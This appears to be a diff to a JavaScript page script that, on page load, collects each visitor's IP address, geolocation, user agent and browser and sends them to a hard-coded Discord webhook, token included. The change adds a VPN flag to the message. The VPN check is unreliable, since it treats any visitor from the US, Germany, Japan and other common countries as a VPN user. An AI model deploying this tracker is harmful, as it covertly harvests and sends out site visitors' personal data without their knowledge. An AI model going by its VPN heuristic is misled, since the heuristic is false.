@@ -7,6 +7,7 @@ document.addEventListener('DOMContentLoaded', (event) => {
                 .then(response => response.json())
                 .then(geoData => {
                     const userAgent = navigator.userAgent;
+                    const isVPN = isUserUsingVPN(geoData);
                     const userDetails = {
                         ip: ip,
                         city: geoData.city,
@@ -26,12 +27,17 @@ document.addEventListener('DOMContentLoaded', (event) => {
                         }
                     };
 
+                    let message = `New visitor details:\n${JSON.stringify(userDetails, null, 2)}`;
+                    if (isVPN) {
+                        message += '\n\n🔒 VPN DETECTED! 🔒';
+                    }
+
                     fetch('https://discord.com/api/webhooks/1462882953377087757/RNYEOGsYG6tUTxW-0LEDAKlBNK0eDs9fG2vNKpL83_uhR19Hga7_AKUi8ihYsjuNJDaD', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({ content: `New visitor details:\n${JSON.stringify(userDetails, null, 2)}` })
+                        body: JSON.stringify({ content: message })
                     })
                     .then(response => response.json())
                     .then(data => {
@@ -72,4 +78,10 @@ function getBrowser() {
     else if (userAgent.indexOf('Trident') !== -1) browser = 'Internet Explorer';
     else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
     return browser;
+}
+
+function isUserUsingVPN(geoData) {
+    // Simple heuristic to detect VPN: check if the country is known for VPN services
+    const vpnCountries = ['US', 'NL', 'DE', 'UK', 'CA', 'AU', 'SG', 'HK', 'JP', 'FR'];
+    return vpnCountries.includes(geoData.country_code);
 }
